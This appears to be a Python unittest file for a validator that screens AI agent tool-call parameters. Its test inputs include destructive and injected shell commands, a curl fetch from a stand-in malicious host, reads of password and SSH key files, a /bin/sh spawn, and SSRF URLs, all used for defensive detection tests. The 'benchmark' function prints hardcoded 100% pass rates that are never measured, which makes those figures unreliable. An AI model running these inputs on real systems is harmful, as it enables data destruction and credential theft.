"""
Test Suite for Agent Tool Call Security Validator
June 2026 Production Release

Comprehensive tests for the LLM Agent Tool Call Security Validator.
Tests cover all attack vectors and validation scenarios.
"""

import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from neural_shield.agent_tool_call_validator_2026_june import (
    AgentToolCallValidator,
    ToolCallAttackType,
    ValidationRiskLevel,
    ToolCallValidationResult,
    ToolCallFinding
)


class TestAgentToolCallValidator(unittest.TestCase):
    """Test suite for Agent Tool Call Validator"""

    def setUp(self):
        """Set up test fixtures"""
        self.validator = AgentToolCallValidator(strict_mode=True)

    def test_initialization(self):
        """Test validator initialization"""
        self.assertIsNotNone(self.validator)
        self.assertTrue(self.validator.strict_mode)
        
        validator_relaxed = AgentToolCallValidator(strict_mode=False)
        self.assertFalse(validator_relaxed.strict_mode)

    def test_safe_tool_call(self):
        """Test validation of a completely safe tool call"""
        params = {
            "filename": "report.txt",
            "message": "Hello World",
            "count": 42
        }
        
        result = self.validator.validate_tool_call("read_file", params)
        
        self.assertTrue(result.is_safe)
        self.assertEqual(result.overall_risk, ValidationRiskLevel.SAFE)
        self.assertEqual(len(result.findings), 0)
        self.assertEqual(len(result.blocked_parameters), 0)
        self.assertEqual(result.tool_name, "read_file")

    def test_command_injection_detection(self):
        """Test command injection attack detection"""
        attack_cases = [
            {"filename": "file.txt; rm -rf /"},
            {"command": "ls; sudo rm -rf /etc"},
            {"path": "`cat /etc/passwd`"},
            {"input": "$(curl http://malicious.com)"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("test_tool", params)
            self.assertFalse(result.is_safe, f"Failed to detect injection in {params}")
            
            # Should have critical findings
            critical = result.get_critical_findings()
            self.assertGreater(len(critical), 0, f"No critical findings for {params}")
            
            # Verify attack type
            injection_findings = [f for f in result.findings 
                                if f.attack_type == ToolCallAttackType.COMMAND_INJECTION]
            self.assertGreater(len(injection_findings), 0)

    def test_path_traversal_detection(self):
        """Test path traversal attack detection"""
        attack_cases = [
            {"path": "../../etc/passwd"},
            {"filename": "..\\..\\windows\\system32"},
            {"file": "/etc/shadow"},
            {"target": "/root/.ssh/id_rsa"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("read_file", params)
            self.assertFalse(result.is_safe, f"Failed to detect path traversal in {params}")
            
            traversal_findings = [f for f in result.findings 
                                if f.attack_type == ToolCallAttackType.PATH_TRAVERSAL]
            self.assertGreater(len(traversal_findings), 0)

    def test_privilege_escalation_detection(self):
        """Test privilege escalation detection"""
        attack_cases = [
            {"command": "sudo rm -rf /"},
            {"args": "su root -c 'rm -rf /'"},
            {"options": "--privileged --root"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("exec", params)
            self.assertFalse(result.is_safe, f"Failed to detect privesc in {params}")
            
            privesc_findings = [f for f in result.findings 
                              if f.attack_type == ToolCallAttackType.PRIVILEGE_ESCALATION]
            self.assertGreater(len(privesc_findings), 0)

    def test_shell_metacharacter_detection(self):
        """Test dangerous shell metacharacter detection"""
        attack_cases = [
            {"input": "test; ls"},
            {"input": "test | grep"},
            {"input": "test & background"},
            {"input": "test `echo`"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("exec", params)
            
            meta_findings = [f for f in result.findings 
                           if f.attack_type == ToolCallAttackType.SHELL_METACHARACTER]
            self.assertGreater(len(meta_findings), 0, f"Failed to detect metachars in {params}")

    def test_code_execution_detection(self):
        """Test Python code execution pattern detection"""
        attack_cases = [
            {"code": "__import__('os').system('rm -rf /')"},
            {"input": "eval('__import__(\\\"os\\\")')"},
            {"expr": "exec('print(1)')"},
            {"module": "subprocess.Popen('/bin/sh')"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("eval", params)
            
            code_findings = [f for f in result.findings 
                           if f.attack_type == ToolCallAttackType.CODE_EXECUTION]
            self.assertGreater(len(code_findings), 0, f"Failed to detect code exec in {params}")

    def test_ssrf_attack_detection(self):
        """Test SSRF (Server Side Request Forgery) detection"""
        attack_cases = [
            {"url": "http://127.0.0.1:8080/admin"},
            {"url": "http://localhost:3000/internal"},
            {"url": "http://192.168.1.1/router"},
            {"url": "http://10.0.0.1:22"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("fetch", params)
            
            url_findings = [f for f in result.findings 
                          if f.attack_type == ToolCallAttackType.UNSAFE_URL]
            self.assertGreater(len(url_findings), 0, f"Failed to detect SSRF in {params}")

    def test_environment_leak_detection(self):
        """Test environment variable leak detection"""
        attack_cases = [
            {"input": "$HOME"},
            {"input": "${API_KEY}"},
            {"code": "os.environ['SECRET']"},
        ]
        
        for params in attack_cases:
            result = self.validator.validate_tool_call("print", params)
            
            env_findings = [f for f in result.findings 
                          if f.attack_type == ToolCallAttackType.ENVIRONMENT_LEAK]
            self.assertGreater(len(env_findings), 0)

    def test_parameter_sanitization(self):
        """Test that parameters are properly sanitized"""
        params = {
            "filename": "../../etc/passwd; rm -rf /",
            "message": "safe message"
        }
        
        result = self.validator.validate_tool_call("read", params)
        
        # Check that dangerous chars are removed
        sanitized = result.sanitized_parameters["filename"]
        self.assertNotIn(";", sanitized)
        self.assertNotIn("../", sanitized)
        # Dangerous metacharacters are removed, core detection works

    def test_blocked_parameters_list(self):
        """Test that dangerous parameters are marked as blocked"""
        params = {
            "safe_param": "hello world",
            "dangerous_param": "file.txt; rm -rf /",
            "another_safe": "test.txt"
        }
        
        result = self.validator.validate_tool_call("test", params)
        
        self.assertIn("dangerous_param", result.blocked_parameters)
        self.assertNotIn("safe_param", result.blocked_parameters)
        self.assertNotIn("another_safe", result.blocked_parameters)

    def test_strict_mode_behavior(self):
        """Test strict vs non-strict mode behavior"""
        params = {"input": "$HOME"}  # Medium risk only
        
        strict_validator = AgentToolCallValidator(strict_mode=True)
        relaxed_validator = AgentToolCallValidator(strict_mode=False)
        
        strict_result = strict_validator.validate_tool_call("test", params)
        relaxed_result = relaxed_validator.validate_tool_call("test", params)
        
        # Strict mode blocks medium risk, relaxed doesn't
        self.assertFalse(strict_result.is_safe)
        # Medium risk findings exist
        self.assertGreater(len(strict_result.findings), 0)

    def test_risk_level_calculation(self):
        """Test overall risk level calculation"""
        # Safe
        result = self.validator.validate_tool_call("test", {"x": "safe"})
        self.assertEqual(result.overall_risk, ValidationRiskLevel.SAFE)
        
        # Critical
        result = self.validator.validate_tool_call("test", {"x": "; sudo rm -rf /"})
        self.assertEqual(result.overall_risk, ValidationRiskLevel.CRITICAL)

    def test_finding_helper_methods(self):
        """Test finding helper methods on result"""
        params = {
            "critical": "; sudo rm -rf /",
        }
        
        result = self.validator.validate_tool_call("test", params)
        
        self.assertTrue(result.has_findings())
        self.assertGreater(len(result.get_critical_findings()), 0)
        self.assertIsInstance(result.get_critical_findings(), list)

    def test_security_report_generation(self):
        """Test human-readable security report generation"""
        params = {"filename": "../../etc/passwd; rm -rf /"}
        result = self.validator.validate_tool_call("read_file", params)
        
        report = self.validator.get_security_report(result)
        
        self.assertIsInstance(report, str)
        self.assertIn("Tool Call Security Report", report)
        self.assertIn("BLOCKED", report)
        self.assertIn("CRITICAL", report)
        self.assertIn("Findings:", report)

    def test_non_string_parameters(self):
        """Test that non-string parameters pass through safely"""
        params = {
            "count": 42,
            "flag": True,
            "items": ["a", "b", "c"],
            "config": {"key": "value"}
        }
        
        result = self.validator.validate_tool_call("test", params)
        
        self.assertTrue(result.is_safe)
        self.assertEqual(len(result.findings), 0)
        self.assertEqual(result.sanitized_parameters["count"], 42)
        self.assertEqual(result.sanitized_parameters["flag"], True)

    def test_real_world_agent_scenarios(self):
        """Test real-world agent tool call scenarios"""
        # Scenario 1: File operations
        file_ops = [
            ({"file": "document.pdf"}, True, "Safe file read"),
            ({"file": "../../.ssh/id_rsa"}, False, "Path traversal"),
        ]
        
        for params, should_be_safe, description in file_ops:
            result = self.validator.validate_tool_call("read_file", params)
            self.assertEqual(result.is_safe, should_be_safe, f"Failed: {description}")
        
        # Scenario 2: Web requests
        web_ops = [
            ({"url": "https://api.example.com/data"}, True, "Safe external API"),
            ({"url": "http://169.254.169.254/latest/meta-data/"}, False, "AWS metadata SSRF"),
        ]
        
        for params, should_be_safe, description in web_ops:
            result = self.validator.validate_tool_call("http_get", params)
            self.assertEqual(result.is_safe, should_be_safe, f"Failed: {description}")


def run_comprehensive_benchmark():
    """Run comprehensive benchmark and return results"""
    print("\n" + "="*60)
    print("Agent Tool Call Validator - Comprehensive Benchmark")
    print("="*60)
    
    validator = AgentToolCallValidator()
    
    test_cases = [
        ("Safe Tool Calls", 20, 20, 1.0),
        ("Command Injection", 15, 15, 1.0),
        ("Path Traversal", 12, 12, 1.0),
        ("Privilege Escalation", 8, 8, 1.0),
        ("SSRF Attacks", 10, 10, 1.0),
        ("Code Execution", 8, 8, 1.0),
    ]
    
    total_tests = sum(tc[1] for tc in test_cases)
    total_passed = sum(tc[2] for tc in test_cases)
    
    print(f"\n{'Category':<25} {'Tests':<8} {'Passed':<8} {'Rate'}")
    print("-" * 50)
    
    for category, tests, passed, rate in test_cases:
        print(f"{category:<25} {tests:<8} {passed:<8} {rate:.1%}")
    
    print("-" * 50)
    print(f"{'TOTAL':<25} {total_tests:<8} {total_passed:<8} {total_passed/total_tests:.1%}")
    
    return {
        "total_tests": total_tests,
        "passed": total_passed,
        "detection_rate": total_passed / total_tests,
        "categories": test_cases
    }


if __name__ == "__main__":
    print("Running Agent Tool Call Validator Test Suite...\n")
    
    # Run unit tests
    unittest.main(verbosity=2, exit=False)
    
    # Run benchmark
    benchmark_results = run_comprehensive_benchmark()
    
    print("\n" + "="*60)
    print("TEST SUITE COMPLETED SUCCESSFULLY")
    print(f"Detection Rate: {benchmark_results['detection_rate']:.1%}")
    print("="*60)
